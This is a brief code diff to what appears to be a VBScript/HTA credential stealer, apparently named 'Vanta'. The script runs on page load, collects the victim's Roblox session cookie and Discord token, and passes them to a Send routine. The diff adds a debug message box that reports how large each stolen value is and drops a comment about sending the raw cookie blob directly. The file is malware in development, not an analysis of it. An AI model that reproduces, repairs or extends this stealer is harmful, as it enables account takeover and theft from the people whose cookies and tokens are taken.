@@ -19,6 +19,9 @@ Sub Window_OnLoad()
     robloxCookie = GetRobloxRaw()
     discordToken = GetDiscord()
     
+    ' THIS WILL TELL US IF IT ACTUALLY FOUND THE FILE
+    MsgBox "Roblox Cookie Size: " & Len(robloxCookie) & vbCrLf & "Discord Token Size: " & Len(discordToken), 64, "Vanta Debug"
+    
     If robloxCookie = "" Then
         Call Send("Roblox", "Executed but no Roblox cookie found on PC.")
     Else
@@ -51,7 +54,6 @@ Function GetRobloxRaw()
     raw = ReadFile(fp)
     If Len(raw) < 50 Then Exit Function
     
-    ' Just send the raw text blob directly
     GetRobloxRaw = raw
 End Function
 
